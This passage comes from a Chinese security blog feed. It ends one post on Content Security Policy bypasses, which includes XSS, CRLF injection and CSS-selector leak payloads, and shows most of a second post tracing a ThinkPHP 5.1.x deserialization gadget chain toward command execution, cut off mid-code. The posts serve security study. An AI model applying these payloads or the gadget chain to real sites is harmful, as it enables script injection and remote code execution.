class="string">'window.location="'</span>.$src.<span class="string">'"'</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>即可成功跳转，这种情况利用姿势很多，比如执行任意 js 函数等等</p><h3 id="object-src-绕过"><a href="#object-src-绕过" class="headerlink" title="object-src 绕过"></a>object-src 绕过</h3><p>object-src 用于设置插件，所以说，如果站点 CSP 设置没有 object-src 或值非 ‘none’ 则可以利用插件 js 执行弹窗或跳转操作</p><p>flash-xss 或者 pdf-xss</p><h3 id="缓存绕过-CSP-nonce"><a href="#缓存绕过-CSP-nonce" class="headerlink" title="缓存绕过 CSP nonce"></a>缓存绕过 CSP nonce</h3><p><a href="https://lorexxar.cn/2017/05/16/nonce-bypass-script/" target="_blank" rel="noopener">通过浏览器缓存来bypass CSP script nonce · LoRexxar&#39;s Blog</a></p><h3 id="CSS-选择器绕过-CSP"><a href="#CSS-选择器绕过-CSP" class="headerlink" title="CSS 选择器绕过 CSP"></a>CSS 选择器绕过 CSP</h3><p>CSS 选择器来读取页面内容，匹配到对应的属性，页面就会发出相应的请求</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*[attribute^="a"]&#123;background:url("record?match=a")&#125; </span><br><span class="line">*[attribute^="b"]&#123;background:url("record?match=b")&#125; </span><br><span class="line">*[attribute^="c"]&#123;background:url("record?match=c")&#125; [...]</span><br></pre></td></tr></table></figure><h3 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h3><p>通过 CRLF 可以注入 HTTP 头，也就可以注入 xss 代码</p><p>比如</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://test.com/?url=%0d%0a%0d%0a<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)</span>&gt;</span></span><br></pre></td></tr></table></figure><p>详细可以看  phithon 的文章 <a href="https://www.leavesongs.com/PENETRATION/Sina-CRLF-Injection.html" target="_blank" rel="noopener">CRLF Injection</a></p><h3 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h3><p>虽然 CSP 在很多时候并不能完全防御 XSS，但大多是因为配置不当等造成的，CSP 仍然有着它自身的价值，综合业务进行合理 CSP 配置并与其他技术结合才是正解</p><p>终极防护：全面禁止脚本</p><p>Reference:</p><p><a href="https://wulidecade.cn/2018/09/24/CSP-And-CSP-Bypass/" target="_blank" rel="noopener">https://wulidecade.cn/2018/09/24/CSP-And-CSP-Bypass/</a><br><a href="http://www.ruanyifeng.com/blog/2016/09/csp.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2016/09/csp.html</a><br><a href="https://xz.aliyun.com/t/5084" target="_blank" rel="noopener">https://xz.aliyun.com/t/5084</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读&lt;/p&gt;
    
    </summary>
    
    
      <category term="CSP" scheme="http://j0k3r.top/tags/CSP/"/>
    
      <category term="前端" scheme="http://j0k3r.top/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP v5.1.x POP 链分析</title>
    <link href="http://j0k3r.top/2019/10/12/ThinkPHP_pop_v5.1.x/"/>
    <id>http://j0k3r.top/2019/10/12/ThinkPHP_pop_v5.1.x/</id>
    <published>2019-10-11T16:00:00.000Z</published>
    <updated>2020-03-26T10:18:48.083Z</updated>
    
    <content type="html"><![CDATA[<p>文章首发于合天智汇：<a href="https://mp.weixin.qq.com/s/8dyuy-rW8-6isvHxmTI33A" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/8dyuy-rW8-6isvHxmTI33A</a></p><a id="more"></a><p>前段时间网上爆出 ThinkPHP 5.1.x 的 POP 链，早就想分析一下，正好最近有空，就记录一下吧</p><p>环境：</p><p>MacOS 10.13 </p><p>MAMAP Pro</p><p>php 7.0.33 + xdebug</p><p>Visual Studio Code</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="我所理解的-POP-Chain："><a href="#我所理解的-POP-Chain：" class="headerlink" title="我所理解的 POP Chain："></a>我所理解的 POP Chain：</h3><p>利用魔术方法并巧妙构造特殊属性调用一系列函数或类方法以执行某种敏感操作的调用堆栈</p><h3 id="反序列化常用魔法函数"><a href="#反序列化常用魔法函数" class="headerlink" title="反序列化常用魔法函数"></a>反序列化常用魔法函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">__wakeup， unserialize() 执行前调用</span><br><span class="line"></span><br><span class="line">__destruct， 对销毁的时候调用</span><br><span class="line"></span><br><span class="line">__toString， 类被当成字符串时的回应方法</span><br><span class="line"></span><br><span class="line">__construct()，当对象创建(new)时会自动调用，注意在</span><br><span class="line"></span><br><span class="line">unserialize()时并不会自动调用</span><br><span class="line"></span><br><span class="line">__sleep()，serialize()时会先被调用</span><br><span class="line"></span><br><span class="line">__call()，在对象中调用一个不可访问方法时调用</span><br><span class="line"></span><br><span class="line">__callStatic()，用静态方式中调用一个不可访问方法时调用</span><br><span class="line"></span><br><span class="line">__get()，获得一个类的成员变量时调用</span><br><span class="line"></span><br><span class="line">__set()，设置一个类的成员变量时调用</span><br><span class="line"></span><br><span class="line">__isset()，当对不可访问属性调用isset()或empty()时调用</span><br><span class="line"></span><br><span class="line">__unset()，当对不可访问属性调用unset()时被调用。</span><br><span class="line"></span><br><span class="line">__wakeup()，执行unserialize()时，先会调用这个函数</span><br><span class="line"></span><br><span class="line">__toString()，类被当成字符串时的回应方法</span><br><span class="line"></span><br><span class="line">__invoke()，调用函数的方式调用一个对象时的回应方法</span><br><span class="line"></span><br><span class="line">__set_state()，调用var_export()导出类时，此静态方法会被调用。</span><br><span class="line"></span><br><span class="line">__clone()，当对象复制完成时调用</span><br><span class="line"></span><br><span class="line">__autoload()，尝试加载未定义的类</span><br><span class="line"></span><br><span class="line">__debugInfo()，打印所需调试信息</span><br></pre></td></tr></table></figure><h3 id="phar-文件通过-phar-伪协议拓宽攻击面"><a href="#phar-文件通过-phar-伪协议拓宽攻击面" class="headerlink" title="phar 文件通过 phar:// 伪协议拓宽攻击面"></a>phar 文件通过 phar:// 伪协议拓宽攻击面</h3><blockquote><p>因为 phar 文件会以序列化的形式存储用户自定义的meta-data，所以在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作,深入了解请至：<a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p></blockquote><table><thead><tr><th>受影响文件系统函数</th><th></th><th></th><th></th></tr></thead><tbody><tr><td>fileatime</td><td>filectime</td><td>file_exists</td><td>file_get_contents</td></tr><tr><td>file_put_contents</td><td>file</td><td>filegroup</td><td>fopen</td></tr><tr><td>fileinode</td><td>filemtime</td><td>fileowner</td><td>fileperms</td></tr><tr><td>is_dir</td><td>is_executable</td><td>is_file</td><td>is_link</td></tr><tr><td>is_readable</td><td>is_writable</td><td>is_writeable</td><td>parse_ini_file</td></tr><tr><td>copy</td><td>unlink</td><td>stat</td><td>readfile</td></tr></tbody></table><p>如果对反序列化没有了解的话建议先学习下相关内容</p><h2 id="ThinkPHP-v5-1-x-POP-链分析"><a href="#ThinkPHP-v5-1-x-POP-链分析" class="headerlink" title="ThinkPHP v5.1.x POP 链分析"></a>ThinkPHP v5.1.x POP 链分析</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>这里使用的是官方 ThinkPHP V5.1.38</p><p>composer 部署</p><p><code>composer create-project topthink/think=5.1.38 tp5.1.38</code></p><h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><p>全局搜索函数 <code>__destruct</code> </p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ThinkPHP_pop_v5.1.x.assets/uxMZLERr74UgmIa.png" alt></p><p>来到 /thinkphp/library/think/process/pipes/Windows.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;close();</span><br><span class="line">       <span class="keyword">$this</span>-&gt;removeFiles();</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">. . .  . . . </span><br><span class="line"></span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 删除临时文件</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">removeFiles</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $filename) &#123;</span><br><span class="line">           <span class="keyword">if</span> (file_exists($filename)) &#123;</span><br><span class="line">               @unlink($filename);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;files = [];</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>看下 <code>file_exists</code> 的描述</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_exists ( string $filename ) : bool</span><br></pre></td></tr></table></figure><p>如果传入的 <code>$filename</code> 是个反序列化的对象，在被 file_exists 当作字符串处理的时候就会触发其 <code>__toString</code> 方法（如果有的话）</p><p>所以下面就是找含 <code>__toString</code> 方法的类</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ThinkPHP_pop_v5.1.x.assets/qVYakLcwTsSpv1I.png" alt></p><p>来到 /thinkphp/library/think/model/concern/Conversion.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span><span class="params">($options = JSON_UNESCAPED_UNICODE)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> json_encode(<span class="keyword">$this</span>-&gt;toArray(), $options);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">. . .   . . . </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;toJson();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，在 <code>toJson()</code> 函数中又调用了 <code>toArray()</code> 函数</p><p>如果 <code>toArray()</code> 函数中存在并使用某个可控变量的方法，那么我们就可以利用这点去触发其他类的 <code>__call</code> 方法</p><p>下面是 <code>toArray()</code> 函数的定义，<code>$this-&gt;append</code> 作为类属性是可控的，所以 <code>$relation</code> 和 <code>$name</code> 也就可控了，于是 <code>$relation-&gt;visible($name);</code> 就成了这个 POP 链中的中间跳板</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $item       = [];</span><br><span class="line">    $hasVisible = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">. . .   . . .</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 追加属性（必须定义获取器）</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;append)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;append <span class="keyword">as</span> $key =&gt; $name) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array($name)) &#123;</span><br><span class="line">                <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                $relation = <span class="keyword">$this</span>-&gt;getRelation($key);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!$relation) &#123;</span><br><span class="line">                    $relation = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br><span class="line">                    <span class="keyword">if</span> ($relation) &#123;</span><br><span class="line">                        $relation-&gt;visible($name);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                $item[$key] = $relation ? $relation-&gt;append($name)-&gt;toArray() : [];</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (strpos($name, <span class="string">'.'</span>)) &#123;</span><br><span class="line">         </span><br><span class="line">           . . .   . . .   </span><br><span class="line">      </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $item[$name] = <span class="keyword">$this</span>-&gt;getAttr($name, $item);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $item;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那我们在这里应该传入怎么样的值以及什么数据呢，先看下 <code>$relation</code> 是如何处理得到的</p><p>跟进 getRelation，在 /thinkphp/library/think/model/concern/RelationShip.php 中找到函数定义</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">trait</span> RelationShip</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">. . .   . . . </span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取当前模型的关联模型数据</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string $name 关联方法名</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelation</span><span class="params">($name = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$name];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">. . .   . . . </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于 getRelation 最终都会 <code>return;</code> 导致返回 NULL，所以 下面的 <code>if (!$relation)</code> 一定成立</p><p>所以直接跟进后面的 getAttr，在 /thinkphp/library/think/model/concern/Attribute.php 找到其定义</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">trait</span> Attribute</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">. . .   . . .</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span><span class="params">($name = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$name];</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$name];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidArgumentException(<span class="string">'property not exists:'</span> . <span class="keyword">static</span>::class . <span class="string">'-&gt;'</span> . $name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">. . .   . . . </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span><span class="params">($name, &amp;$item = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $notFound = <span class="keyword">false</span>;</span><br><span class="line">            $value    = <span class="keyword">$this</span>-&gt;getData($name);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvalidArgumentException $e) &#123;</span><br><span class="line">            $notFound = <span class="keyword">true</span>;</span><br><span class="line">            $value    = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        . . .  . . . </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从 getAttr —&gt; getData 返回 data 数组中同名键值的元素值，即 <code>$relation &lt;---- $this-&gt;data[$name]</code>，我们需要的 <code>$data</code> 和 <code>$append</code> 分别位于 Attribute 和 Conversion，且两者都是 trait 类型</p><p>Trait 可以说是和 Class 相似，是 PHP 5.4.0 开始实现的一种代码复用的方法，可以使用 use 加载，举个例子</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ThinkPHP_pop_v5.1.x.assets/M56YmyLlDWxp84B.png" alt></p><p>详情可以看官方手册 <a href="https://www.php.net/manual/zh/language.oop5.traits.php" target="_blank" rel="noopener">PHP: Trait - Manual</a></p><p>所以接下来是寻找一个同时使用了 Attribute 和 Conversion 的类</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ThinkPHP_pop_v5.1.x.assets/RgBKpY2EaTWoZNm.png" alt></p><p>发现只有 /thinkphp/library/think/Model.php 满足条件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span> <span class="keyword">implements</span> \<span class="title">JsonSerializable</span>, \<span class="title">ArrayAccess</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">RelationShip</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">ModelEvent</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">TimeStamp</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"></span><br><span class="line">. . .   . . .</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面就需要找到一个没有 visible 方法却有 __call 方法的类作为执行点</p><p>找到 /thinkphp/library/think/Request.php 中的 Request 类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">. . .   . . . </span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 扩展方法</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $hook = [];</span><br><span class="line">    </span><br><span class="line">    . . .   . . . </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (array_key_exists($method, <span class="keyword">$this</span>-&gt;hook)) &#123;</span><br><span class="line">            array_unshift($args, <span class="keyword">$this</span>);</span><br><span class="line">            <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;hook[$method], $args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'method not exists:'</span> . <span class="keyword">static</span>::class . <span class="string">'-&gt;'</span> . $method);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">. . .   . . .</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的回调参数来源于 <code>$hook</code> 数组，而且方法名和参数都是可控的，不过 <code>array_unshift</code> 函数会把若干元素前置到数组的开头</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$queue = <span class="keyword">array</span>(<span class="string">"orange"</span>, <span class="string">"banana"</span>);</span><br><span class="line">array_unshift($queue, <span class="string">"apple"</span>, <span class="string">"raspberry"</span>);</span><br><span class="line">print_r($queue);</span><br><span class="line"></span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; apple</span><br><span class="line">    [<span class="number">1</span>] =&gt; raspberry</span><br><span class="line">    [<span class="number">2</span>] =&gt; orange</span><br><span class="line">    [<span class="number">3</span>] =&gt; banana</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>这样的话明显就很难执行命令了，因为参数数组的第一个元素始终是 <code>$this</code>，无法直接执行我们想要的命令， 需要其他某种对参数不是这么敏感的函数作为一个新的执行点或者跳板</p><p>Request 类中有一个 filterValue 函数具有过滤功能，寻找调用 filterValue 的地方以便控制 <code>$value</code> 和 <code>$filters</code> 好执行命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filterValue</span><span class="params">(&amp;$value, $key, $filters)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $default = array_pop($filters);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($filters <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_callable($filter)) &#123;</span><br><span class="line">            <span class="comment">// 调用函数或者方法过滤</span></span><br><span class="line">            $value = call_user_func($filter, $value);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_scalar($value)) &#123;</span><br><span class="line">            </span><br><span class="line">         . . .   . . .         </span><br><span class="line">         </span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Request 类中的 input 函数由 array_walk_recursive 调用了 filterValue，但是参数仍不可控，再往上寻找调用点看看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span><span class="params">($data = [], $name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">false</span> === $name) &#123;</span><br><span class="line">          <span class="comment">// 获取原始数据</span></span><br><span class="line">          <span class="keyword">return</span> $data;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      $name = (string) $name;</span><br><span class="line">      <span class="keyword">if</span> (<span class="string">''</span> != 